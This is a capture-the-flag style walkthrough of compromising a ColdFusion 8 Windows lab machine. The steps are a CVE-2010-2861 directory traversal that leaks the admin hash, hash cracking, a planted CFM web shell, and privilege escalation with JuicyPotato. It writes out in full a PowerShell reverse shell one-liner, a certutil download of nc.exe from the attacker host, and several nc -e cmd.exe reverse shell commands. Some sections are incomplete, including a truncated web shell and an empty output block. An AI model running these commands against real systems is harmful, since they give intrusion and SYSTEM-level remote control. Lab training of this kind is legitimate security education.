## Enumeration

### Directory Traversal Research

**Research:** ColdFusion 8 has a well-documented directory traversal vulnerability (CVE-2010-2861). This allows reading arbitrary files on the server by manipulating the `locale` parameter in the administrator login page.

The vulnerability works by:
1. Using `../../../../` to traverse up directories
2. Reading `password.properties` which contains the admin password hash
3. Using a null byte (`%00`) to truncate the filename check

```bash
curl -s 'http://10.129.1.28:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en' | grep password
```

**Expected Output:**
```
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

📸 **Screenshot 4:** Leaked password hash

**Research:** The hash is 40 characters, which indicates **SHA1**. The `password.properties` file stored the password in this format.

### Password Cracking

```bash
echo "2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt --show
```

**Research:** `hashcat -m 100` specifies SHA1. The rockyou wordlist is a common password list. This is a straightforward dictionary attack.

**Expected Output:**

### Scheduled Tasks for Code Execution

**Research:** ColdFusion's scheduled tasks feature allows executing arbitrary code by defining tasks that download and run files. This is a common technique when direct file upload is restricted.

I need to create a web shell that ColdFusion can execute. The webshell must:
1. Be a `.cfm` file (ColdFusion Markup)
2. Submit commands to itself (self-referencing)
3. Be hosted on my Kali machine

```bash
cat > shell2.cfm << 'EOF'
<html>
<body>
<cfoutput>
<table>
<form method="POST" action="shell2.cfm">
```

## Getting a Reverse Shell

### The PowerShell Reverse Shell One-Liner

**Research:** The CFM shell can execute commands via `cfexecute`. I'll use PowerShell to create a reverse shell because:
1. PowerShell is installed on all modern Windows systems
2. It can make TCP connections natively without additional tools
3. The one-liner is self-contained and doesn't require dropping files

**Start listener:**
```bash
rlwrap nc -lvnp 443
```

**Research:** `rlwrap` provides command history and editing in the netcat session. `nc -lvnp 443` listens on port 443 (common SSL port, often allowed through firewalls).

**In the CFM shell (Command: cmd.exe / Options):**
```
/c powershell -NoProfile -ExecutionPolicy Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**What this PowerShell does:**
1. Creates a TCP client connecting to my Kali IP on port 443
2. Gets the network stream
3. Reads commands from the stream
4. Executes them with `Invoke-Expression` (`iex`)
5. Sends the output back through the stream

## Privilege Escalation

### Research: Why JuicyPotato?

**Research:** `whoami /priv` shows the user has `SeImpersonatePrivilege`. This privilege allows a process to impersonate another user's security context. On Windows, this privilege is often exploitable with tools like:
- **RottenPotato** (older, less reliable)
- **JuicyPotato** (more reliable, more flexible)
- **Chimichurri** (MS10-059, kernel exploit)

JuicyPotato works by:
1. Using COM (Component Object Model) to trigger an authentication attempt
2. Capturing the authentication token of the SYSTEM account
3. Using `CreateProcessWithToken` or `CreateProcessAsUser` to start a new process with that token

**Research:** The critical piece is that the target is Windows Server 2008 R2 with `SeImpersonatePrivilege` enabled. This combination is vulnerable.

### Getting a Stable Shell

**Research:** The PowerShell reverse shell is functional but prone to disconnection. Netcat (`nc.exe`) provides a more stable shell because:
1. `cmd.exe` is more resilient than PowerShell for interactive use
2. Netcat handles stdin/stdout/stderr more reliably

**On Kali:**
```bash
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
python3 -m http.server 8000
```

**Download nc.exe to the target:**
```cmd
certutil -urlcache -split -f "http://10.10.14.7:8000/nc.exe" C:\ProgramData\nc.exe
```

**Research:** `certutil` is a built-in Windows utility that can download files from URLs.

**Get stable shell:**
1. Start listener: `rlwrap nc -lvnp 5555`
2. In CFM shell: `cmd.exe /c C:\ProgramData\nc.exe 10.10.14.7 5555 -e cmd.exe`

### The Working JuicyPotato Command

**Why this specific command works:**

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -a "/c C:\ProgramData\nc.exe 10.10.14.7 4445 -e cmd.exe"
```

| Part | Purpose |
|------|---------|
| `-l 1337` | COM server port |
| `-p cmd.exe` | Use cmd.exe as the parent process |
| `-t *` | Try all CLSIDs automatically |
| `-a` | Arguments to pass to the process |
| `/c` | Tell cmd.exe to execute the command then exit |
| `C:\ProgramData\nc.exe` | Full path to netcat |
| `10.10.14.7 4445` | My Kali IP and listener port |
| `-e cmd.exe` | Execute cmd.exe on connection |

**Research:** Using `cmd.exe` as the parent process fixes the argument parsing issue that occurs when passing `nc.exe` directly. The `/c` flag ensures the command executes correctly. Using port 4445 avoids any potential conflicts.

**Start listener:**
```bash
rlwrap nc -lvnp 4445
```

## Troubleshooting Notes

### Why Certain Commands Failed

| Issue | Reason | Fix |
|-------|--------|-----|
| `File not found: /cfexec.cfm` | The shell referenced itself incorrectly | Use `action="shell2.cfm"` |
| `CreateProcessWithTokenW Failed: 2` | `nc.exe` not in current directory | Use full path `C:\ProgramData\nc.exe` |
| `CreateProcessWithTokenW Failed` | Arguments not parsed correctly | Use `cmd.exe` as parent with `/c` |
| JuicyPotato no connection | Wrong port / listener not ready | Use different port, start listener first |
